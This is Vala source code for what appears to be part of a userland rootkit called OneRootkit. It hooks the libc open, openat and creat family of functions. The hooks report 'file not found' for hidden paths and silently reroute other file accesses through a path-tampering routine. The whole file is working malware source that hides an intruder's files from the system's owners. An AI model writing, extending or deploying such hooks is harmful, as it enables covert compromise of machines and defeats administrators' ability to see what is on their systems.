using Posix;

// all the open family: open, open64, openat, openat64, creat, creat64

delegate unowned int OpenMethod(string path, int flags, mode_t mode=0);
delegate unowned int OpenatMethod(int dirfd, string path, int flags, mode_t mode=0);
delegate unowned int CreatMethod(string path, mode_t mode);

public static int open(string path, int flags, mode_t mode=0) 
{
	OpenMethod oldOpen = (OpenMethod) DLHandles.LIBC().GetMethod("open");

	if(OneRootkit.IsPathHidden(path))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	string tamperedPath = TamperPath.TamperOpenPath(path);
	return oldOpen(tamperedPath, flags, mode);
}

public static int open64(string path, int flags, mode_t mode=0) 
{
	OpenMethod oldOpen64 = (OpenMethod) DLHandles.LIBC().GetMethod("open64");

	if(OneRootkit.IsPathHidden(path))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	string tamperedPath = TamperPath.TamperOpenPath(path);
	return oldOpen64(tamperedPath, flags, mode);
}

public static int openat(int dirfd, string path, int flags, mode_t mode=0) 
{
	string realPath = "";
	OpenMethod oldOpen = (OpenMethod) DLHandles.LIBC().GetMethod("open");

	string dirfdPath = OneRootkit.GetFdProcLink(dirfd);

	if(dirfdPath != null)
	{
		realPath = dirfdPath + "/" + path;
	}
	else
	{
		realPath = realpath(path);
	}

	if(OneRootkit.IsPathHidden(realPath))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	string tamperedPath = TamperPath.TamperOpenPath(realPath);
	return oldOpen(tamperedPath, flags, mode);
}

public static int openat64(int dirfd, string path, int flags, mode_t mode=0) 
{
	string realPath = "";
	OpenMethod oldOpen = (OpenMethod) DLHandles.LIBC().GetMethod("open64");

	string dirfdPath = OneRootkit.GetFdProcLink(dirfd);

	if(dirfdPath != null)
	{
		realPath = dirfdPath + "/" + path;
	}
	else
	{
		realPath = realpath(path);
	}

	if(OneRootkit.IsPathHidden(realPath))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	string tamperedPath = TamperPath.TamperOpenPath(realPath);
	return oldOpen(tamperedPath, flags, mode);
}

public static int creat(string path, mode_t mode) 
{
	CreatMethod oldCreat = (CreatMethod) DLHandles.LIBC().GetMethod("creat");

	if(OneRootkit.IsPathHidden(path))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	string tamperedPath = TamperPath.TamperOpenPath(path);
	return oldCreat(tamperedPath, mode);
}

public static int creat64(string path, mode_t mode) 
{
	CreatMethod oldCreat = (CreatMethod) DLHandles.LIBC().GetMethod("creat64");

	if(OneRootkit.IsPathHidden(path))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	string tamperedPath = TamperPath.TamperOpenPath(path);
	return oldCreat(tamperedPath, mode);
}